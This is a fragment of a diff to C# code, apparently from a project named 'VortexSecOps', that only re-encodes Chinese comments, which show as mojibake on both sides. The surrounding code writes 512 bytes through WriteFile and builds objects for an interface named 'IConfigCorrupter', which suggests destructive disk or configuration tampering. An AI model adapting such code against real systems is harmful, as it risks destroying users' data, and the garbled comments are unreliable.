                             if (WriteFile(handle, buffer, 512, ref write, IntPtr.Zero))
                             {
-                                // ¹Ø±Õ¾ä±ú
+                                // å…³é—­å¥æŸ„
                                 CloseHandle(handle);
                                 return true;
                             }
@@ -673,7 +673,7 @@ namespace VortexSecOps
                     {
                         if (handle != IntPtr.Zero)
                         {
-                            // ¹Ø±Õ¾ä±ú
+                            // å…³é—­å¥æŸ„
                             CloseHandle(handle);
                         }
                     }
@@ -681,12 +681,12 @@ namespace VortexSecOps
                 }
             }
 
-            // ´´½¨Ö¸¶¨½Ó¿ÚÀàĞÍµÄÊµÀı
+            // åˆ›å»ºæŒ‡å®šæ¥å£ç±»å‹çš„å®ä¾‹
             public static T Create<T>() where T : class
             {
                 if (typeof(T) == typeof(IWindowsAPIOperator) || typeof(T) == typeof(INormalOperator) || typeof(T) == typeof(IConfigCorrupter))
                 {
-                    // Èç¹ûÊÇÖ¸¶¨µÄ½Ó¿ÚÀàĞÍ£¬Ôò´´½¨ OpMaster ÊµÀı²¢×ª»»ÎªÖ¸¶¨ÀàĞÍ
+                    // å¦‚æœæ˜¯æŒ‡å®šçš„æ¥å£ç±»å‹ï¼Œåˆ™åˆ›å»º OpMaster å®ä¾‹å¹¶è½¬æ¢ä¸ºæŒ‡å®šç±»å‹
                     return new OpMaster() as T;
                 }
                 return null;
